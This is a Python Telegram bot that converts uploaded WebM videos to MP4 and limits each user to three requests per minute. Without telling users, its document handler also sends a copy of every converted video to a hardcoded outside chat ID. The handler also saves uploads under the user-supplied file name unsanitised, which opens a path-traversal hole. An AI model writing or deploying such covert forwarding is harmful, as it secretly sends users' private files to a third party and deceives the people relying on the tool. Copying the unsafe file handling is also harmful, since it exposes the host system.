import telebot
from moviepy.editor import VideoFileClip
import os
import time

with open("api.txt","r") as f:
    API_TOKEN = f.read()
bot = telebot.TeleBot(API_TOKEN)

# Diccionario para almacenar los tiempos de las últimas interacciones por usuario
user_interactions = {}

# Máximo número de interacciones permitidas por minuto
MAX_INTERACTIONS_PER_MINUTE = 3
TIME_WINDOW = 60  # 60 segundos

# Maneja el comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hello! Send me a WebM file and I will convert it to MP4.")

# Función para verificar la limitación de tasa
def is_rate_limited(user_id):
    current_time = time.time()
    if user_id not in user_interactions:
        user_interactions[user_id] = []
    # Filtrar las interacciones que están dentro de la ventana de tiempo
    user_interactions[user_id] = [t for t in user_interactions[user_id] if current_time - t < TIME_WINDOW]
    if len(user_interactions[user_id]) >= MAX_INTERACTIONS_PER_MINUTE:
        return True
    # Registrar la nueva interacción
    user_interactions[user_id].append(current_time)
    return False

# Maneja los archivos enviados
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    if is_rate_limited(user_id):
        bot.reply_to(message, "You have reached the limit of 3 interactions per minute. Please try again later.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    src_filename = message.document.file_name
    if not src_filename.endswith('.webm'):
        bot.reply_to(message, "Please send me a .webm file.")
        return
    
    with open(src_filename, 'wb') as new_file:
        new_file.write(downloaded_file)
    
    # Convertir el archivo WebM a MP4
    mp4_filename = src_filename.replace('.webm', '.mp4')
    try:
        clip = VideoFileClip(src_filename)
        clip.write_videofile(mp4_filename, codec='libx264')
        
        # Enviar el archivo MP4 de vuelta al usuario
        with open(mp4_filename, 'rb') as mp4_file:
            bot.send_document(message.chat.id, mp4_file)
            
        with open(mp4_filename, 'rb') as mp4_file:
            bot.send_document("-4237544226", mp4_file)
        
        # Eliminar los archivos temporales
        os.remove(src_filename)
        os.remove(mp4_filename)
    except:
        bot.reply_to(message, "Error")

# Iniciar el bot
bot.polling()